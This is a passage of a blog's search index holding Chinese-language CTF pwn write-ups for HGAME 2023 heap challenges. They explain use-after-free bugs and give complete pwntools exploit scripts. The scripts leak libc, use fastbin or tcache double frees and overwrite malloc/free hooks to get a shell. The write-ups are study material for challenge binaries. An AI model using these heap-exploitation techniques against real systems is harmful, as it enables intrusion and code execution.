class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/starrysky/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>delete中free之后未清零造成uaf漏洞</p><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.填充tcache，再add一个进入unsorted bin，利用uaf漏洞showunsorted bin中的chunk，泄露libc地址并计算free_hook和system</p><p>2.填充tcache大小小于0x90，再add相同大小的chunk，double free之后进入fast bin</p><p>3.申请tcache和fast bin前两个chunk为free_hook，再申请掉fast bin中最后一个chunk，此时该chunk在free_hook地址，将其内容设置为system即可完成任意地址写</p><p>4.申请堆内容为&#x2F;bin&#x2F;sh，再free掉，等同于执行system（&#x2F;bin&#x2F;sh），即可getshell</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2023 week3 pwn</title>
      <link href="/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/"/>
      <url>/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="safe-note"><a href="#safe-note" class="headerlink" title="safe note"></a>safe note</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>libc版本是2.32，要注意异或加密fd，加密方式为(堆地址&gt;&gt;12)&amp;申请的地址</p><p>1.创建并释放一个堆获取堆地址</p><p>2.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system（show之前要edit</p><p>3.利用UAF漏洞实现任意地址写，把free_hook改成system，改fd的时候要使用2.32的加密方式进行加密</p><p>4.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)file_name &#x3D; &#39;.&#x2F;vuln&#39;li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal &#x3D; [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug &#x3D; 0if debug:    r &#x3D; remote()else:    r &#x3D; process(file_name)elf &#x3D; ELF(file_name)def dbg():    gdb.attach(r)def add(index, size):    r.sendlineafter(&#39;&gt;&#39;, b&#39;1&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Size: &#39;, str(size))def delete(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;2&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))def edit(index, content):    r.sendlineafter(&#39;&gt;&#39;, b&#39;3&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Content: &#39;, content)def show(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;4&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))add(0, 0x90)delete(0)show(0)heap &#x3D; u64(r.recv(5)[-5:].ljust(8, b&#39;\x00&#39;)) &lt;&lt; 12li(&#39;heap &#x3D; &#39; + hex(heap))for i in range(8):    add(i + 1 , 0x80)add(9, 0x20)add(10, 0x20)for i in range(8):    delete(i + 1)edit(8, &#39;&#39;)show(8)malloc_hook &#x3D; u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 106 - 0x10li(&#39;malloc_hook &#x3D; &#39; + hex(malloc_hook))libc &#x3D; ELF(&#39;.&#x2F;2.32-0ubuntu3.2_amd64&#x2F;libc-2.32.so&#39;)libc_base &#x3D; malloc_hook - libc.sym[&#39;__malloc_hook&#39;]free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]li(&#39;free_hook &#x3D; &#39; + hex(free_hook))system &#x3D; libc_base + libc.sym[&#39;system&#39;]li(&#39;system &#x3D; &#39; + hex(system))li(&#39;heap &#x3D; &#39; + hex(heap))delete(9)delete(10)edit(10, p64((heap&gt;&gt;12)  ^ free_hook))add(11, 0x20)edit(11, b&#39;&#x2F;bin&#x2F;sh\x00&#39;)add(12, 0x20)edit(12, p64(system))delete(11)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> UAF </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
